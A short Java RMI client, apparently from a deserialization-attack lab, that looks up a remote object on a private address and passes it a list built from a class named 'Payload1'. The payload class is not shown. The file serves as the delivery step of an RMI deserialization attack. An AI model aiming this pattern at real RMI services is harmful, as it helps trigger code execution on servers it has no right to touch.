import java.rmi.Naming;
import java.util.List;
import java.util.ArrayList;
import java.io.Serializable;

public class RMIClient implements Serializable {
    public void lookup() throws Exception {
        ICalc r = (ICalc) Naming.lookup("rmi://192.168.1.107:1099/refObj");
        List<Integer> li = new Payload1();
        li.add(3);
        li.add(4);
        System.out.println(r.sum(li));
    }
    public static void main(String[] args) throws Exception {
        new RMIClient().lookup();
    }
}